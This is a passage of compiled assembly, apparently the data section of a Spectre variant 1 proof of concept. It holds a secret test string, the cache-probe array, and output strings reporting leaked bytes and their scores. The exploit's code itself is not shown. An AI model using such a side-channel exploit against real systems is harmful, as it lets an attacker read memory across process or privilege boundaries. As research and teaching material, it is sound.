	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	2
secret:
	.long	.L.str
	.size	secret, 4

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	array2,@object                  # @array2
	.globl	array2
array2:
	.zero	131072
	.size	array2, 131072

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,4
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
unused2:
	.zero	64
	.size	unused2, 64

	.type	unused3,@object                 # @unused3
	.globl	unused3
unused3:
	.zero	64
	.size	unused3, 64

	.type	unused4,@object                 # @unused4
	.globl	unused4
unused4:
	.zero	64
	.size	unused4, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym last_x
	.addrsig_sym array1
	.addrsig_sym array2
